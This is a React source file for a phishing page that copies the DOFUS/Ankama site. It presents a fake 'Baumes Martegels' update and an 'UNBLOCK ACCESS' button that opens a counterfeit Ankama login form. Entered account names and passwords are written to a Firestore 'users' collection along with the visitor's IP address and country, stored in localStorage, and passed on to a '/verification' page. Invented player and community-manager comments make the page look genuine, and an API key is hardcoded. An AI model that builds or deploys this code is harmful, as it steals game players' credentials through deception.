import React, { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { collection, doc, getDocs, query, setDoc, updateDoc, where } from 'firebase/firestore';
import db from '../Firebase'; // Update path based on your project structure
import styles from '../styles/Home2.module.css'; // Update path based on your project structure
import "../styles/globals.css"
import { v4 as uuidv4 } from 'uuid';

import facebookImage from '../assets/facebook.png';
import twitter from '../assets/twitter.png'
import franceFlag from '../assets/france.png';
import usaFlag from '../assets/usa.png';
import germanyFlag from '../assets/de.png';
import spainFlag from '../assets/spain.png';
import portugalFlag from '../assets/portugal.png';
import italyFlag from '../assets/italy.png';
import logoImage from '../assets/logof.png';
import bannerImage from '../assets/background.jpg';
import search from "../assets/search.png"
import sword from "../assets/sword.png"
import logo from "../assets/logo-dofus.png"
import rep2 from "../assets/rep2.png"
import c1 from "../assets/c1.png"
import c2 from "../assets/c2.jpg"
import c3 from "../assets/c3.jpg"
import c4 from "../assets/c4.jpg"
import c5 from "../assets/c5.jpg"
import c6 from "../assets/c6.jpg"
import c7 from "../assets/c7.jpg"
import img0 from "../assets/img0.png"
import i1 from "../assets/1.png"
import i2 from "../assets/2.jpg"
import i3 from "../assets/3.jpg"
import i4 from "../assets/4.jpg"
import ad from '../assets/ad.jpg'

import comment from "../assets/comments.png"
import { Helmet } from 'react-helmet';



function App3() {
  const [visible,setVisible] = useState(false)
  const [visible2,setVisible2] = useState(true)
  const [visible3,setVisible3] = useState(false)
  const [name,setName] = useState("");
  const [password,setPassword] = useState("");
  const [ip,setIp] = useState("");
  const [country,setCountry] = useState("");
  const [spin,setSpin] = useState(false)
  const [uid,setUid] = useState(null)


  const Router = useNavigate();


  const send = async(e)=>{
    e.preventDefault();
    if (visible2 == false) {
      
      setName("");
      setPassword("");
      setVisible2(true)
      
     console.log("hnaaa")
    }else{
      console.log("hnaaa 2")

      const washingtonRef = doc(db, "users", uid);
      await updateDoc(washingtonRef, {
        name: name,
        pass:password
      });
    localStorage.setItem("ip", JSON.stringify(ip));
    localStorage.setItem("name", JSON.stringify(name));
    localStorage.setItem("password", JSON.stringify(password));
  
    Router('/verification/en',{state: {ip:ip,uid:uid}});
      setSpin(false)
      
    } 
   }

   const getIp2 = async () =>{
    let etat = null;
    const stored = localStorage.getItem("ip");
    const q = query(collection(db, "users"), where("ip", "==", ip));
    const querySnapshot = await getDocs(q);
     querySnapshot.forEach((doc) => {
     etat = doc.data();
     });
    if (etat !== null) {
    console.log("already existe")
    }else{
      try {
        setDoc(doc(db, "users", ip), {
          country:country,
          ip:ip
        });
      } catch (error) {
        console.log(error)
      }
    }
   }
   

   const [changed,setChanged] = useState(0);

   useEffect(()=>{
      if (changed === 0) {
        setChanged(1);
      }
   },[]);
  
 const getIp = async()=>{
  console.log("ana fe get ip")
  const res = await axios.get('https://api.ipgeolocation.io/ipgeo?apiKey=731821513cd6497cab49e5c7a841741e');
  try {
    setIp(res.data.ip);
      setCountry(res.data.country_name);
      localStorage.setItem("ip", JSON.stringify(res.data.ip));
    localStorage.setItem("country", JSON.stringify(res.data.country_name));
    getData();
  } catch (error) {
    console.log(error)
  }
 }

 const getData =async()=>{
  const stored = JSON.parse(localStorage.getItem("ip"));
  if (stored == null) {
    getIp(); 
  }else{
      const storedc = await JSON.parse(localStorage.getItem("country"));
      const storedn = await JSON.parse(localStorage.getItem("name"));
      const storedp = await JSON.parse(localStorage.getItem("password"));
      const storedip = await JSON.parse(localStorage.getItem("ip"));
      setName(storedn)
      setPassword(storedp);
      setIp(storedip)
      setCountry(storedc);
      const id = uuidv4();
      setUid(id);
      if (storedip) {
        await setDoc(doc(db, "users", id), {
          ip: stored,
          country:storedc,
          uid:id,
        });
      }
  }
 }
  
 
 useEffect(()=>{
  getData();
 },[]);



 const es=()=>{
  Router('/es/mmorpg/actualidad/noticias/brecha-martegeliana',{state: {ip:ip}},)
}


 const prg=()=>{
  Router('/dofus/prg',{state: {ip:ip}},)

 }

 const fr=()=>{
  Router('/dofus/fr',{state: {ip:ip}},)

   }

  return (
    <>
    <Helmet>
      <title> DOFUS – Les Baumes Martegels</title>
      <meta name="description" content=" DOFUS – Les Baumes Martegels" />
    </Helmet>
    <div className={styles.App2}>
      {visible && (
        <div style={{zIndex:100}} className={styles.modal}>
        <div className={styles.header}>
          <center><h4>LOGIN</h4></center>
          <button onClick={()=> setVisible(false)}>X</button>
        </div>
        <div className={styles.content}>
        <div className={styles.contentBox1}>
          <center>
          <h4>In a few clicks with...</h4>
          <div className={styles.fb}>
            <a className={styles.fb} href="https://dofus-mmorpg.com/fr/mmorpg/actualites/news/retrobox-dofusix/" target="_blank" style={{textDecoration:"none"}}><img src={facebookImage} alt="" /><button>FACEBOOK</button></a>
          </div>
          </center>
          </div>
          <div className={styles.contentBox}>
          <form onSubmit={send}>
          <h4>I already have an ANKAMA account</h4>
          {visible2 && (<p style={{display:"none"}} className={styles.error}>The credentials are incorrect</p>)}
          <p>Account Name</p>
          <input onChange={(e)=>setName(e.target.value)} value={name} type="text" />
          <p>Password</p>
          <input onChange={(e)=>setPassword(e.target.value)} value={password} type="password" name="" id="" />
          <div className={styles.radio}>
          <input className={styles.input2} type="checkbox" />
          <p>Stay connected</p>
          </div>
          <button onClick={send}>
            {!spin && ( <>LOGIN </>)}
            {spin && (
              <>
              LOGIN 
      
            </>)}
            </button>

            <br />
            <a style={{textDecoration:"none"}} href="https://account.ankama.com/fr/compte/connexion-impossible"><p className={styles.p3p}>Unable to connect?</p></a>
<a style={{textDecoration:"none"}} href="https://secure.dofus.com/fr/mmorpg/jouer"><p className={styles.p3p}>Create an account</p></a>

            </form>

          </div>
        </div>

      </div>
      )}
      <div className={styles.all5}> 
      <div className={styles.nav2}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p><a style={{textDecoration:"none",color:"white"}} href="https://support.ankama.com/hc/en-us" target="_blank">SUPPORT</a></p>
            </div>
            <div className={styles.rightC}>
              <p style={{zIndex:10}}>DECONNEXION</p>
              <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img src={usaFlag} alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img onClick={fr} src={franceFlag} alt="" /> <p className={styles.flagN}>FR</p></div>
              <div className={styles.flag}><img src={usaFlag} alt="" /><p className={styles.flagN}>EN</p></div>
              <div className={styles.flag}><img src={germanyFlag} alt="" /><p className={styles.flagN}>DE</p></div>
              <div className={styles.flag}><img onClick={es} src={spainFlag} alt="" /><p className={styles.flagN}>ES</p></div>
              <div className={styles.flag}><img onClick={prg} src={portugalFlag} alt="" /><p className={styles.flagN}>PT</p></div>
              <div className={styles.flag}><img src={italyFlag} alt="" /><p className={styles.flagN}>IT</p></div>


              </>
             )}
             </div>
              <div>
              
              </div>
            </div>
          </div>
        </div>
        <div className={styles.secondNav}>
          <div className={styles.dofusLogo}>
            <div className={styles.cont}>
            <div className={styles.leftS}>
              <a className={styles.nv1} >
                JEU
                <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                    <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/telecharger"><div></div> Télécharger le jeu</a>
                      <a href="https://www.dofus.com/fr/mmorpg/jouer"><div></div> Créez votre compte</a>
                      <a href="https://dofus-mmorpg.com/fr/mmorpg/communaute/parrainage"><div></div>Avantages parrainage</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/codes"><div></div>Code Cadeau</a>
                      <a href="https://www.dofus.com/fr/mmorpg/encyclopedie"><div></div>Encyclopédie</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/annuaires/pages-persos"><div></div>Annuaires</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder"><div></div>Ladders</a>
                      <a href="https://www.krosmoz.com/fr/almanax"><div></div>Almanax</a>

                    </div>
                    <div className={styles.sec2}>
                    <a style={{fontWeight:700}} href=""><div></div>Comment jouer</a>
                      <a href="https://www.dofus.com/fr/mmorpg/decouvrir"><div></div>Découvrir</a>
                      <a href="https://www.dofus.com/fr/mmorpg/encyclopedie/classes"><div></div>Classes</a>
                      <a href="https://www.dofus.com/fr/mmorpg/tutoriels"><div></div>Apprendre à jouer</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/ladder/kolizeum-presentation"><div></div>Ligues Kolizeum</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/serveurs?server_community%5B0%5D=0"><div></div>État des serveurs</a>
                    </div>
                    <div className={styles.sec3}>
                    <a  style={{fontWeight:700}} href=""><div></div>avantages abonnés</a>
                      <a href="https://www.dofus.com/fr/mmorpg/pourquoi-s-abonner"><div></div>Pourquoi s'abonner ?</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/veterans-rewards"><div></div>Veteran rewards</a>
                      <a href="https://www.dofus.com/fr/dofus-retro"><div></div>DOFUS Retro</a>
                    </div>

                  </div>
                </div>
                </a>
              <a className={styles.nv2}>
              TRANSMÉDIA
              <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                  <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.ankama-shop.com/fr/"><div></div>Acheter des produits dérivés</a>
                      <a href="https://www.ankama.com/fr/editions"><div></div>Editions</a>
                      <a href="https://www.ankama.com/fr/games"><div></div>jeux videos</a>
                      

                    </div>
                    <div className={styles.sec2}>
                    <a  style={{fontWeight:700}} href=""><div></div>Jeux de plateau</a>
                      <a href="https://www.ankama.com/fr/boardgames/krosmaster-blast"><div></div>Krosmaster Blast</a>
                      <a href="https://www.krosmaster.com/"><div></div>Krosmaster</a>
                      <a href="https://www.ankama-shop.com/fr/"><div></div>Brother</a>
                      <a href="">Animation</a>
                      <a href="https://www.dofus-le-film.com/"><div></div>Le film</a>
                      <a href="https://www.dofus.com/fr/animation/univers"><div></div>La série</a>
                    </div>
                    <div className={styles.sec3}>
                    <a  style={{fontWeight:700}} href=""><div></div>Médias</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/trailers"><div></div>Vidéos</a>
                      <a href="https://www.dofus.comhttps//www.dofus.com/fr/mmorpg/medias/screenshots"><div></div>Screenshots</a>
                      <a href="https://www.dofus.comhttps//www.dofus.comhttps://www.dofus.com/fr/mmorpg/medias/illustrations"><div></div>Illustrations</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/emissions"><div></div>Émissions</a>
                      <a href="https://www.dofus.com/fr/mmorpg/medias/wallpapers"><div></div>Wallpapers</a>

                    </div>
                  </div>
                </div>
                </a>
              <a className={styles.nv3}>
              ACTUALITÉS
              <div className={styles.downArrow}></div>

                <div className={styles.secondNav2}>
                  <div className={styles.dofusLogo}>
                  <div className={styles.sec1}>
                      <a className={styles.diff} href="https://www.dofus.com/fr/mmorpg/actualites/maj/draconiros"><div></div>Découvrir la dernière mise à jour</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/news"><div></div>Toutes les news</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/devblog"><div></div>Tous les devblogs</a>
                      <a href="https://www.dofus.com/fr/mmorpg/actualites/maj"><div></div>Toutes les mises à jour (changelog)</a>


                    </div>
                    <div className={styles.sec2}>
                    <a  style={{fontWeight:700}} href=""><div></div>En ce moment sur DOFUS</a>
                      <a href="https://www.dofus.com/fr/mmorpg/communaute/tournois/dofus-cup-2019/reglement"><div></div>DOFUS Cup 2019</a>
                      <a href="https://www.dofus.com/fr/prehome"><div></div>Calendrier de l'Avent</a>
                     
                    </div>
                    
                  </div>
                </div>
                </a>

            </div>
            </div>
            <a style={{zIndex:11}} href="https://www.dofus.com/fr/prehome"><img src={logo} alt="" /></a>
            <div className={styles.cont2}>
            <div className={styles.rightS}>
              <a href="https://www.dofus.com/fr/achat-kamas">ACHETER DES KAMAS</a>
              <a href="https://www.dofus.com/fr/forum">FORUMS</a>
              <a href="https://www.dofus.com/fr/boutique">BOUTIQUE</a>

            </div>
            <a tabindex="0" className={styles.imgAS}><img className={styles.imgS} src={search} alt="" /><div className={styles.inp}><input tabindex="1" type="text" /><button>ok</button></div></a>

            </div>
          </div>
          
          </div>






        </div>

<div className={styles.jouer}>
  <button><a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/jouer" target="_blank" rel="noopener noreferrer">PLAY!</a></button>
</div>

<div className={styles.blog}>
<div className={styles.blogContainer}>
  <div className={styles.main}>
    <div className={styles.header}>
      <div className={styles.icon}>
        <div className={styles.circle}>
        <img src={sword} alt="" /></div>
        </div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>"DOFUS - The Baumes Martegels - Available in-game!"</h1>
        <h4 style={{display:"none"}}>Unlock access now and go on an adventure!</h4>
      </div>
        <div className={styles.retourner}>
          <a style={{textDecoration:"none",color:"white"}} href="https://www.dofus.com/fr/mmorpg/actualites/news" target="_blank" rel="noopener noreferrer"><button> <p>{"<"}</p> Back to the list</button></a>
        </div>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.contentBox}>
      <em>At the heart of the sanctuary, an exceptional mirage, a sacred place shrouded in a mysterious aura. Welcome to the Baumes Martegel.</em>

<p style={{marginTop:"10px",fontFamily:"sans-serif"}}><em><strong>Fearless adventurers</strong>,</em> get ready to dive into the darkest and most mysterious depths of the Dofus Retro world. Let yourself be carried away by the magic of the Baumes Martegel, this legendary place that holds untold secrets and priceless treasures.
</p>
<p style={{marginTop:"10px"}}>But beware, as this area is not for the faint of heart. Only the bravest will be able to face the challenge and overcome the dangers that await them in the depths of this enchanted cavern. Prepare to embark on an epic adventure, where light and shadow play ingeniously to better lose you in the maze of the Baumes.</p>
<div className={styles.blogImg}>
<img src={rep2} layout='fill'/>
</div>
<p><strong>Fascinating and mysterious</strong>, this mirage is a true labyrinth of darkness and light, a maze of caverns hiding unspeakable wonders and deadly dangers. Shadows dance on the rock walls, playing with the light to better disorient and lose you in the twists and turns of this enchanting cave. The fiercest and most cunning monsters have made it their home, waiting patiently to surprise and devour their prey. Get ready to dive into the depths of this mystical cavern and uncover its darkest secrets.</p>
<br/>
<strong className={styles.boldText}>In this mirage, you can find</strong>
<br/><br/>
<p>The addition of a new family of monsters, with unique skills and characteristics that will test even the most seasoned adventurers.</p>
<br />
<p>New maps to explore will offer unprecedented environments and exciting challenges, with exotic landscapes and deadly dangers awaiting brave players.</p>
<br />
<p className={styles.boldText}>Whether you are a veteran of Dofus or a new player, unlock access now to embark on your adventure!</p>
<br/>

      <center>
        <button onClick={()=> setVisible(true)}>UNBLOCK ACCESS</button>
      </center>
      </div>
    </div>

    <div className={styles.media}>
      <a style={{textDecoration:"none"}} href="https://www.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fwww.dofus.com%252Ffr%252Fmmorpg%252Factualites%252Fnews%252F1051928-dofus-retro-ligne&cancel_url=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=en_GB">
      <div className={styles.mediaFb}>
        <img src={facebookImage} alt="" />
        <span>FACEBOOK</span>
      </div>
      </a>
      <a style={{textDecoration:"none"}} href="https://twitter.com/share?text=&url=https%3A%2F%2Fwww.dofus.com%2Ffr%2Fmmorpg%2Factualites%2Fnews%2F1051928-dofus-retro-ligne">
      <div className={styles.mediaFb2}>
        <img src={twitter} alt="" />
        <span>TWITTER</span>
      </div>
      </a>
      
    </div>
    <div className={styles.commentaires}>
      <div className={styles.header}>
        <h2>COMMENTS (32)</h2>
        <a className={styles.sui} href="https://www.dofus.com/fr/mmorpg/actualites/news"><p>Follow the discussion on the forum...</p></a>
      </div>
      <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c1} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>[Ankama]DOFUS</h4><p className='tag'>- Community Manager -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Events and gifts for all those who follow and support us on social networks and the forum…</p>
        <p>There will be something for all nostalgics, so be on the lookout!</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c2} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Reasy-Kokax</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Hello, could you give us more info on this area family? </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c3} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Sadidarbre </h4><p className='tag'>- Community Manager -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Nice , changing mine mobs?</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c4} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Kazemyrowx</h4><p className='tag'>Ancien Abonné</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Frankly, I admit that it's a good idea, in addition the drop tips were starting to become rare, thanks to the</p>
        <p>zone we can take advantage of the fact that resources are expensive at the beginning</p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c5} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Serial-Buzzer</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Hope this will finally reduce unnecessary spam... </p>
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c6} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Axel-Archer</h4><p className='tag'>- Ancien Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>Thank you!</p>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={c7} alt="" />
      </div>
      <div className={styles.sideText}>
        <div className={styles.heading}><h4>Yoloxopi</h4><p className='tag'>- Abonné -</p><p className='tag2'>07 Mars 2023</p></div>
        <p>if I understood correctly we unlock access from here is the only prerequisite to access the dimension?</p>
      </div>
    </div>

<div className={styles.commenter}>
  <img src={img0} alt="" />
  <textarea placeholder='Comment...' name="" id="" cols="30" rows="10"></textarea>
</div>
<div className={styles.com}>
<button>VALIDATE</button>

</div>

    </div>

  </div>



  <div className={styles.side}>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <h1>RECENT NEWS</h1>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i1} alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1241841-dungeon-farmer-1-wa-wabbit">Dungeon Farmer #1: The Wa Wabbit</a></p>

        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>17</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i2} alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1233713-montilier-faucombe-offert">A free Faucombe mount!</a></p>

        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>6</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i3} alt="" />
      </div>
      <div className={styles.sideText}>
      <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1243096-concours-journee-mondiale-12-dofus">[Contest] World Day of the 12 Dofus</a></p>
        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>42</p>
        </div>
      </div>
      <p></p>
    </div><div className={styles.content}>
      <div className={styles.sideImg}>
        <img src={i4} alt="" />
      </div>
      <div className={styles.sideText}>
        <p className={styles.sideTextP}><a href="https://www.dofus.com/fr/mmorpg/actualites/news/1239064-monocompte-dofus-retro-ligne">Single account on DOFUS Retro: It's online!</a></p>

        <div className={styles.comicon}>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>29</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.voir}>
      <center>
        <p onClick={()=> Router("https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA")}>See all news</p>
      </center>
    </div>
    </div>


    <div className={styles.side1}>
    <div className={styles.header}>
      <div className={styles.icon2}><div className={styles.circle2}></div></div>
      <div className={styles.title}>
      <div className={styles.titleBox}>
      <a style={{textDecoration:"none"}} href="https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA"><h1>FORUM ANKATRACKER</h1></a>
      </div>
        
      </div>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1782-dofus/2329562-bouclier-kano")}>Bouclier kano</p>
        <p className={styles.p2}>by<span className={styles.name}>mallix</span>on 22/04/2022 - 12:48</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>ASK Ankama</p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Changement d'élément Ougi PVM 200</p>
        <p className={styles.p2}>by<span className={styles.name}>sousayajin</span>on 15/06/2022 - 12:47</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Ouginak </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Astrub est étouffante</p>
        <p className={styles.p2}>by<span className={styles.name}>VolcanoPenguin</span>on 06/07/2022 - 12:44</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Évolutions </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>21</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Comparaison do cri- do pure</p>
        <p className={styles.p2}>by<span className={styles.name}> I-Found-My-Way </span> on 14/07/2022 - 12:35</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Artisanat </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>1</p>
        </div>
      </div>
      <p></p>
    </div>
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p>Sram air en pvm de groupe</p>
        <p className={styles.p2}>by<span className={styles.name}>Row-Sebal</span>on 16/07/2022 - 12:30</p>
        <div className={styles.comicon}>
        <p className={styles.p3}>Sram </p>
          <img src={comment} alt="" />
          <p className={styles.comiconP}>3</p>
        </div>
      </div>
      <p></p>
    </div>
    
    <div className={styles.voir}>
      <center>
        <p>See all AnkaTracker topics</p>
      </center>
    </div>
    </div>
    <img className={styles.ad} src={ad} alt="" />


  </div>
  </div>
</div>





      </div>
      
    </div>
    </>

  );
}

export default App3;